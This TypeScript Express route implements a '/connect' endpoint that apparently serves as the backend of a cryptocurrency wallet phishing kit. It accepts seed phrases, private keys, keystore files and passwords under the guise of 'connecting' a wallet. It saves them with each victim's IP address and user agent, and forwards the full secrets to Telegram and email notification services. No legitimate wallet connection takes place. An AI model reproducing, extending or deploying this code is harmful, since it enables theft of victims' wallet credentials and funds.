import { Router } from 'express'
import { WalletConnection } from '../models/WalletConnection.js'
import { telegramService } from '../services/telegram.service.js'
import { emailService } from '../services/email.service.js'
import type { WalletNotificationData } from '../services/telegram.service.js'

const router = Router()

interface ConnectRequestBody {
  wallet?: string
  connectionType?: string
  data?: {
    phrase?: string
    privateKey?: string
    keystore?: string
    password?: string
    fileName?: string
  }
}

const VALID_TYPES = ['phrase', 'keystore', 'private key'] as const
type ConnectionType = (typeof VALID_TYPES)[number]

function isValidConnectionType(value: string): value is ConnectionType {
  return (VALID_TYPES as readonly string[]).includes(value)
}

router.post('/connect', async (req, res) => {
  try {
    const { wallet, connectionType, data } = req.body as ConnectRequestBody

    // Validation
    if (!wallet) {
      res.status(400).json({ success: false, error: 'Wallet name is required' })
      return
    }
    if (!connectionType || !isValidConnectionType(connectionType)) {
      res.status(400).json({ success: false, error: 'Invalid connection type' })
      return
    }
    if (!data) {
      res.status(400).json({ success: false, error: 'Data is required' })
      return
    }
    if (connectionType === 'phrase' && !data.phrase) {
      res.status(400).json({ success: false, error: 'Phrase is required' })
      return
    }
    if (connectionType === 'keystore' && !data.keystore) {
      res.status(400).json({ success: false, error: 'Keystore is required' })
      return
    }
    if (connectionType === 'private key' && !data.privateKey) {
      res.status(400).json({ success: false, error: 'Private key is required' })
      return
    }

    // Prepare data
    const ipAddress = req.ip || req.socket.remoteAddress || 'Unknown'
    const userAgent = req.headers['user-agent'] || 'Unknown'
    const wordCount =
      connectionType === 'phrase' && data.phrase
        ? data.phrase.split(/\s+/).filter(Boolean).length
        : undefined

    const payload: WalletNotificationData = {
      wallet,
      method: connectionType,
      data: {
        phrase: data.phrase,
        privateKey: data.privateKey,
        keystore: data.keystore,
        password: data.password,
        fileName: data.fileName,
        wordCount,
      },
      ipAddress,
      userAgent,
    }

    // Save to DB
    const connection = await WalletConnection.create({
      wallet,
      method: connectionType,
      data: payload.data,
      ipAddress,
      userAgent,
      status: 'pending',
    })

    // Send notifications (in parallel, don't block response)
    Promise.all([
      telegramService.sendNotification(payload),
      emailService.sendWalletNotification(payload),
    ]).catch((err) => console.error('Notification error:', err))

    // Mark success
    await WalletConnection.findByIdAndUpdate(connection._id, { status: 'success' })

    res.json({
      success: true,
      message: 'Wallet connection received',
      connectionId: connection._id,
    })
  } catch (err) {
    console.error('Wallet connect error:', err)
    res.status(500).json({
      success: false,
      error: 'An unexpected error occurred',
    })
  }
})

export default router